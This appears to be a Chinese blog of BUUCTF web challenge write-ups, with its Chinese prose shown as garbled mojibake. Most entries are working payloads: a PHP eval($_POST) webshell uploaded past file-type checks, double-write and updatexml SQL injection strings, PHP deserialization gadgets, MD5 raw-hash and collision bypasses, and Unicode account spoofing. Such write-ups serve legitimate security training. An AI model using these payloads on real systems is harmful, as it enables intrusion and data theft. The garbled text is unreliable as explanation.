<h2 id="11æå®¢å¤§æŒ‘æˆ˜-2019http">11ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Http
</h2><p>æŸ¥çœ‹æºç å‘ç°Secret.php</p>
<p>It doesnâ€™t come from â€˜https://www.Sycsecret.comâ€™ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªé¡µé¢å¾—æ¥è‡ªhttps://www.Sycsecret.comï¼Œæ·»åŠ refererå³å¯</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250110210415792.png"
	width="1569"
	height="772"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250110210415792_hu15219035731630051655.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250110210415792_hu12807455415671497828.png 1024w"
	loading="lazy"
	
		alt="image-20250110210415792"
	
	
		class="gallery-image" 
		data-flex-grow="203"
		data-flex-basis="487px"
	
></p>
<p>æ·»åŠ User-Agent:Syclover</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250110210613494.png"
	width="1508"
	height="622"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250110210613494_hu14163787657773204977.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250110210613494_hu10732868678703024959.png 1024w"
	loading="lazy"
	
		alt="image-20250110210613494"
	
	
		class="gallery-image" 
		data-flex-grow="242"
		data-flex-basis="581px"
	
></p>
<p>æ·»åŠ X-Forwarded-For:127.0.0.1</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250110210725577.png"
	width="1559"
	height="739"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250110210725577_hu6624016257549609572.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250110210725577_hu13133051348444938672.png 1024w"
	loading="lazy"
	
		alt="image-20250110210725577"
	
	
		class="gallery-image" 
		data-flex-grow="210"
		data-flex-basis="506px"
	
></p>
<h2 id="12æå®¢å¤§æŒ‘æˆ˜-2019upload">12ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload
</h2><p>è¦æ±‚ä¸Šä¼ å›¾ç‰‡ï¼Œæˆ‘ä»¬æŠŠæ–‡ä»¶ç±»å‹æ”¹ä¸ºimage/jpeg</p>
<p>ä¸‹é¢è¡¥ä¸ŠGIF89a</p>
<p>ä¸Šä¼ çš„å†…å®¹è¢«è¯†åˆ«å‡º&lt;?è¦æ”¹ä¸º</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;script language=&#39;php&#39;&gt;@eval($_POST[&#39;cmd&#39;]);&lt;/script&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åå°è¯•ç­‰ä»·åç¼€åï¼Œæœ€åphtmlä¸Šä¼ æˆåŠŸï¼Œè¿›uploadç›®å½•ï¼Œèšå‰‘è¿æ¥</p>
<h2 id="13æå®¢å¤§æŒ‘æˆ˜-2019knife">13ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife
</h2><p>èšå‰‘è¿æ¥</p>
<h2 id="14actf2020-æ–°ç”Ÿèµ›upload">14ã€[ACTF2020 æ–°ç”Ÿèµ›]Upload
</h2><p>å‰ç«¯éªŒè¯æŠŠonsubmitåˆ æ‰ï¼Œåé¢è·Ÿ12é¢˜ä¸€æ ·</p>
<h2 id="15æå®¢å¤§æŒ‘æˆ˜-2019babysql">15ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL
</h2><p>å•å¼•å·é—­åˆï¼Œç„¶åå¾ˆå¤šè¢«è¿‡æ»¤äº†ï¼Œéƒ½ç”¨åŒå†™ç»•è¿‡,check.phpåæ‹¼æ¥</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">username=1%27%20ununionion%20seselectlect%201,2,group_concat(column_name)%20frfromom%20infoorrmation_schema.columns%20whwhereere%20table_schema=%27ctf%27%23&amp;password=1
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="16æå®¢å¤§æŒ‘æˆ˜-2019php">16ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP
</h2><p>www.zipä¸‹è½½æºç </p>
<p>ååºåˆ—åŒ–</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Name</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$username</span> <span class="o">=</span> <span class="s1">&#39;admin&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$password</span> <span class="o">=</span>  <span class="s1">&#39;100&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$select</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Name</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$select</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æŠŠç»“æœçš„å¥‡æ€ªç¬¦å·ç”¨%00ä»£æ›¿ï¼Œ%00æ˜¯ç©ºæ ¼çš„urlç¼–ç </p>
<h2 id="17actf2020-æ–°ç”Ÿèµ›backupfile">17ã€[ACTF2020 æ–°ç”Ÿèµ›]BackupFile
</h2><p>phpå¼±æ¯”è¾ƒkey=123</p>
<h2 id="18roarctf-2019easy-calc">18ã€[RoarCTF 2019]Easy Calc
</h2><p>æºç é‡Œé¢æŸ¥çœ‹calc.php</p>
<p>numä¼ å‚åªèƒ½ä¼ æ•°å­—ï¼Œä½†æ˜¯æˆ‘ä»¬ç”¨+numæˆ–è€…ç©ºæ ¼numå°±èƒ½ä¼ å­—ç¬¦ï¼Œå› ä¸ºç°åœ¨çš„å˜é‡å«â€œ numâ€ï¼Œè€Œä¸æ˜¯â€œnumâ€ã€‚ä½†phpåœ¨è§£æçš„æ—¶å€™ï¼Œä¼šå…ˆæŠŠç©ºæ ¼ç»™å»æ‰ï¼Œè¿™æ ·ä»£ç è¿˜èƒ½æ­£å¸¸è¿è¡Œï¼Œè¿˜ä¸Šä¼ äº†éæ³•å­—ç¬¦ã€‚</p>
<p>è¿‡æ»¤/ï¼Œæˆ‘ä»¬ç”¨chr(47)ç»•è¿‡ï¼Œphpinfo();çœ‹åˆ°ç¦ç”¨system,ç”¨var_dump(scandir(/))</p>
<p>çœ‹åˆ°flagæ˜¯f1agg</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">+</span><span class="n">num</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="n">var_dump</span><span class="p">(</span><span class="n">file_get_contents</span><span class="p">(</span><span class="n">chr</span><span class="p">(</span><span class="mi">47</span><span class="p">)</span><span class="o">.</span><span class="n">f1agg</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="19æå®¢å¤§æŒ‘æˆ˜-2019buyflag">19ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag
</h2><p>å¯†ç å¼±æ¯”è¾ƒï¼Œmoneyç”¨1e9æˆ–è€…money[]=1æ•°ç»„ç»•è¿‡ï¼Œcookieé‡Œé¢useræ”¹ä¸º1</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250206172645773.png"
	width="1825"
	height="598"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250206172645773_hu2127346124669215180.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250206172645773_hu4321684527321767191.png 1024w"
	loading="lazy"
	
		alt="image-20250206172645773"
	
	
		class="gallery-image" 
		data-flex-grow="305"
		data-flex-basis="732px"
	
></p>
<h2 id="20bjdctf2020easy-md5">20ã€BJDCTF2020]Easy MD5
</h2><p>æ‰“å¼€ç½‘ç»œï¼Œçœ‹åˆ°hint</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250207104904850.png"
	width="1918"
	height="362"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250207104904850_hu16747176574055752088.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250207104904850_hu16931399427505801973.png 1024w"
	loading="lazy"
	
		alt="image-20250207104904850"
	
	
		class="gallery-image" 
		data-flex-grow="529"
		data-flex-basis="1271px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select * from &#39;admin&#39; where password=md5($pass,true)
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¦åœ¨passwordè¿™é‡Œæ‹¼æ¥ä¸€ä¸ªor 1å°±å¯ä»¥ä½¿ç»“æœä¸ºçœŸ</p>
<p>md5åŠ å¯†åå¾—åˆ°hashå€¼ï¼Œsqlè¯­å¥ä¼šæŠŠhexå€¼è½¬ä¸ºascii</p>
<p>ffifdyop è¿™ä¸ªå­—ç¬¦ä¸²è¢« md5 å“ˆå¸Œäº†ä¹‹åä¼šå˜æˆ <code>276f722736c95d99e921722cf9ed621c</code>ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²å‰å‡ ä½åˆšå¥½æ˜¯<code> ' or '6</code></p>
<p>æ‹¼æ¥åç»“æœä¹Ÿä¸ºçœŸ</p>
<p>è®¡ç®—è„šæœ¬</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;;)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl"> <span class="k">for</span> <span class="p">(</span><span class="nv">$c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$c</span> <span class="o">&lt;</span> <span class="mi">1000000</span><span class="p">;</span> <span class="nv">$c</span><span class="o">++</span><span class="p">,</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">stripos</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$i</span><span class="p">,</span> <span class="k">true</span><span class="p">),</span> <span class="s1">&#39;\&#39;or\&#39;&#39;</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">   <span class="k">echo</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">md5(</span><span class="si">$i</span><span class="s2">) = &#34;</span> <span class="o">.</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$i</span><span class="p">,</span> <span class="k">true</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="k">echo</span> <span class="s2">&#34;.&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><h3 id="md5å‡½æ•°">md5å‡½æ•°
</h3><p>md5 å‡½æ•°é€šå¸¸ç”¨äºè®¡ç®—è¾“å…¥å­—ç¬¦ä¸²çš„ MD5 å“ˆå¸Œå€¼ã€‚md5(string, raw) è¿™ç§å½¢å¼çš„å‡½æ•°è°ƒç”¨ä¸­ï¼Œstring æ˜¯éœ€è¦è¿›è¡Œå“ˆå¸Œè®¡ç®—çš„è¾“å…¥å­—ç¬¦ä¸²ï¼Œè€Œ raw æ˜¯ä¸€ä¸ªå¸ƒå°”ç±»å‹çš„å‚æ•°ï¼Œç”¨äºæŒ‡å®šè¿”å›çš„å“ˆå¸Œå€¼çš„æ ¼å¼ã€‚</p>
<p>stringï¼šè¿™æ˜¯å¿…éœ€çš„å‚æ•°ï¼Œä»£è¡¨è¦è¿›è¡Œ MD5 å“ˆå¸Œè®¡ç®—çš„åŸå§‹å­—ç¬¦ä¸²æ•°æ®ã€‚å¯ä»¥æ˜¯ä»»æ„é•¿åº¦çš„æ–‡æœ¬ä¿¡æ¯ï¼Œä¾‹å¦‚ç”¨æˆ·å¯†ç ã€æ–‡ä»¶å†…å®¹ç­‰ã€‚
rawï¼šè¿™æ˜¯ä¸€ä¸ªå¯é€‰å‚æ•°ï¼Œä¸åŒç¼–ç¨‹è¯­è¨€å¯¹è¯¥å‚æ•°çš„å¤„ç†å’Œå«ä¹‰å¯èƒ½æœ‰æ‰€ä¸åŒï¼Œä½†ä¸€èˆ¬æ¥è¯´ï¼š
å½“ raw ä¸º true æˆ–è€…ç±»ä¼¼è¡¨ç¤ºçœŸçš„å€¼æ—¶ï¼Œå‡½æ•°ä¼šè¿”å›åŸå§‹çš„ 128 ä½ï¼ˆ16 å­—èŠ‚ï¼‰äºŒè¿›åˆ¶æ ¼å¼çš„å“ˆå¸Œå€¼ã€‚
å½“ raw ä¸º false æˆ–è€…ç±»ä¼¼è¡¨ç¤ºå‡çš„å€¼æ—¶ï¼Œå‡½æ•°ä¼šè¿”å›ä»¥ 32 ä½åå…­è¿›åˆ¶å­—ç¬¦ä¸²å½¢å¼è¡¨ç¤ºçš„å“ˆå¸Œå€¼ã€‚
æ¥ä¸‹æ¥æ˜¯md5å¼±æ¯”è¾ƒ,å¼€å¤´ä¸º0eå°±è¡Œ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">MAUXXQC 0e478478466848439040434801845361
</span></span><span class="line"><span class="cl">IHKFRNS 0e256160682445802696926137988570
</span></span><span class="line"><span class="cl">GZECLQZ 0e537612333747236407713628225676
</span></span><span class="line"><span class="cl">GGHMVOE 0e362766013028313274586933780773
</span></span><span class="line"><span class="cl">GEGHBXL 0e248776895502908863709684713578
</span></span><span class="line"><span class="cl">EEIZDOI 0e782601363539291779881938479162
</span></span><span class="line"><span class="cl">DYAXWCA 0e424759758842488633464374063001
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åæ˜¯md5å¼ºæ¯”è¾ƒï¼Œæ•°ç»„ç»•è¿‡</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">param1[]=1&amp;param2[]=2
</span></span><span class="line"><span class="cl">æˆ–è€…ç¡®å®æœ‰a!=bä½†æ˜¯MD5å€¼ç›¸åŒçš„
</span></span><span class="line"><span class="cl">param1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&amp;param2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2
</span></span><span class="line"><span class="cl">æˆ–è€…
</span></span><span class="line"><span class="cl">a=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%24%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%82%7D%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%84%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEcC%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%BC%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%99%B59%F9%FF%C2&amp;b=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%A4%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%02%7E%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%04%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEc%C3%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%3C%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%9959%F9%FF%C2
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="21hctf-2018admin">21ã€[HCTF 2018]admin
</h2><p>éšä¾¿æ³¨å†Œè´¦å·æœ‰ä¸ªä¿®æ”¹å¯†ç çš„é€‰é¡¹</p>
<p>æŸ¥çœ‹æºç </p>
<p>è¿™é‡Œæœ‰ä¸€ä¸ªé“¾æ¥ä½†æ˜¯å¤±æ•ˆäº†ï¼Œç½‘ä¸Šæ‰¾åˆ«äººçš„wp,å¾—åˆ°secret_key=ckj123ï¼Œéœ€è¦ä¼ªé€ session</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250207114708477.png"
	width="1477"
	height="414"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250207114708477_hu2983879188177521985.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250207114708477_hu12810230351352630441.png 1024w"
	loading="lazy"
	
		alt="image-20250207114708477"
	
	
		class="gallery-image" 
		data-flex-grow="356"
		data-flex-basis="856px"
	
></p>
<p>ç„¶åæ”¹session,å¾—åˆ°flag</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250207114736442.png"
	width="1082"
	height="367"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250207114736442_hu9379540159199588482.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250207114736442_hu451247868980856512.png 1024w"
	loading="lazy"
	
		alt="image-20250207114736442"
	
	
		class="gallery-image" 
		data-flex-grow="294"
		data-flex-basis="707px"
	
></p>
<p>unicodeæ¬ºéª—ï¼Œæºç é‡Œé¢æœ‰strlowerå‡½æ•°ï¼Œæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªå¤§å†™çš„ADMINè´¦æˆ·ï¼Œä¼šè¢«ç¼–è¯‘æˆå°å†™çš„ï¼Œç„¶åä¿®æ”¹å¯†ç å°±èƒ½ç™»å…¥ï¼Œä½†éšåå‘ç°æ³¨å†Œå’Œç™»å½•éƒ½ç”¨äº†è½¬å°å†™ï¼Œæ³¨å†ŒADMINçš„è®¡åˆ’å¤±è´¥</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">def strlower(username):
</span></span><span class="line"><span class="cl">    username = nodeprep.prepare(username)
</span></span><span class="line"><span class="cl">    return username
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œçš„nodeprep.prepareå­˜åœ¨æ¼æ´</p>
<p><code>á´€Ê™á´„á´…á´‡êœ°É¢ÊœÉªá´Šá´‹ÊŸá´É´á´á´˜Ê€êœ±á´›á´œá´ á´¡Êá´¢</code>è¿™ç§ç¼–ç ä¼šå…ˆè½¬ä¸ºå¤§å†™çš„ï¼Œå†è½¬ä¸ºå°å†™ï¼Œå°±èƒ½ä¼ªé€ admin</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">á´€ -&gt; A -&gt; a
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>æ³¨å†Œç”¨æˆ·á´€dmin</li>
<li>ç™»å½•ç”¨æˆ·á´€dminï¼Œå˜æˆAdmin</li>
<li>ä¿®æ”¹å¯†ç Adminï¼Œæ›´æ”¹äº†adminçš„å¯†ç </li>
</ul>
<h2 id="22mrctf2020ä½ ä¼ ä½ å‘¢">22ã€[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢
</h2><p>ä¼ .htaccessæ–‡ä»¶æŠŠjpgè½¬ä¸ºphpï¼ŒæŠ“åŒ…æ”¹æ–‡ä»¶æ ¼å¼ï¼Œè¿™é‡Œjpgä¸è¡Œè¦ç”¨pngï¼Œä¸Šä¼ èšå‰‘è¿æ¥</p>
<h2 id="23zjctf-2019nizhuansiwei">23ã€[ZJCTF 2019]NiZhuanSiWei
</h2><p>textç”¨dataä¼ å€¼ï¼Œç„¶åfileä¼ useless.phpçœ‹phpå†…å®¹</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250207135556890.png"
	width="1005"
	height="754"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250207135556890_hu14058552428265661589.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250207135556890_hu3027424829034215574.png 1024w"
	loading="lazy"
	
		alt="image-20250207135556890"
	
	
		class="gallery-image" 
		data-flex-grow="133"
		data-flex-basis="319px"
	
></p>
<p>è¿˜æœ‰ä¸€ä¸ªpasswordè¦ååºåˆ—åŒ–</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Flag</span><span class="p">{</span>  <span class="c1">//flag.php  
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">public</span> <span class="nv">$file</span><span class="o">=</span><span class="s2">&#34;flag.php&#34;</span><span class="p">;</span>  
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__tostring</span><span class="p">(){</span>  
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">)){</span>  
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="s2">&#34;U R SO CLOSE !///COME ON PLZ&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>  
</span></span><span class="line"><span class="cl">    <span class="p">}</span>  
</span></span><span class="line"><span class="cl"><span class="p">}</span>  
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">Flag</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="24æå®¢å¤§æŒ‘æˆ˜-2019hardsql">24ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL
</h2><p>ç©ºæ ¼å’Œ/**/è¢«è¿‡æ»¤äº†ï¼Œç”¨ï¼ˆï¼‰ç»•è¿‡ï¼Œç”¨æŠ¥é”™æ³¨å…¥</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">username=1&#39;or(updatexml(1,concat(0x7e,database(),0x7e),1))#&amp;password=1
</span></span><span class="line"><span class="cl">username=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database()))),0x7e),1))#&amp;password=1
</span></span><span class="line"><span class="cl">username=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(database()))),0x7e),1))#&amp;password=1
</span></span><span class="line"><span class="cl">username=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e),1))#&amp;password=1
</span></span></code></pre></td></tr></table>
</div>
</div><p>flagæ˜¾ç¤ºä¸å…¨ï¼Œsubstringè¢«è¿‡æ»¤ï¼Œåªèƒ½ç”¨leftå’Œrightæ„é€ </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">username=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))#&amp;password=1
</span></span></code></pre></td></tr></table>
</div>
</div><p>flag{8c32c5d2-2601-4575-b121-a16d5f8c0d2e}</p>
<h2 id="ç½‘é¼æ¯-2020-é’é¾™ç»„areuserialz">[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz
</h2><p>ä¸¤ç§è§£æ³•</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">FileHandler</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$op</span><span class="o">=</span><span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$filename</span><span class="o">=</span><span class="s1">&#39;flag.php&#39;</span><span class="p">;</span>
